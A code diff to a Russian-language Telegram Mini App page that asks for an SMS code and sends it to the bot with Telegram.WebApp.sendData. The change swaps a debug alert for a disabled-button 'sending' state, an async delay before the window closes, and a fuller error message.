@@ -8,7 +8,7 @@
 </head>
 <body style="font-family: sans-serif; text-align: center; padding: 20px; background: #1c1c1e; color: #fff;">
     <h3>Введите код из SMS</h3>
-    <input type="text" id="code" inputmode="numeric" maxlength="8" placeholder="12345" 
+    <input type="text" id="code" inputmode="numeric" maxlength="8" placeholder="12345"
            style="font-size: 22px; padding: 10px; width: 100%; box-sizing: border-box;">
     <br><br>
     <button id="submitBtn" onclick="sendCode()" style="font-size: 20px; padding: 12px 30px;">Подтвердить</button>
@@ -17,23 +17,28 @@
         Telegram.WebApp.ready();
         Telegram.WebApp.expand();
 
-        function sendCode() {
+        async function sendCode() {
             const code = document.getElementById('code').value.trim();
             if (code.length < 4) {
                 alert('Введите код (минимум 4 цифры)');
                 return;
             }
-            // ОТЛАДОЧНЫЙ АЛЕРТ: покажет, что функция вызвана
-            alert('Отправляю код: ' + code);
+
+            const btn = document.getElementById('submitBtn');
+            btn.disabled = true;
+            btn.textContent = 'Отправка...';
 
             try {
+                // Отправляем данные
                 Telegram.WebApp.sendData(JSON.stringify({ code: code }));
-                // Не закрываем сразу, даём время на отправку
-                setTimeout(function() {
-                    Telegram.WebApp.close();
-                }, 500);
+                // Даём немного времени на отправку, но не закрываем сразу
+                await new Promise(resolve => setTimeout(resolve, 300));
+                // Закрываем окно
+                Telegram.WebApp.close();
             } catch (e) {
-                alert('Ошибка отправки: ' + e.message);
+                alert('Ошибка отправки: ' + e.message + '\n\nПопробуйте обновить страницу и ввести код заново.');
+                btn.disabled = false;
+                btn.textContent = 'Подтвердить';
             }
         }
     </script>
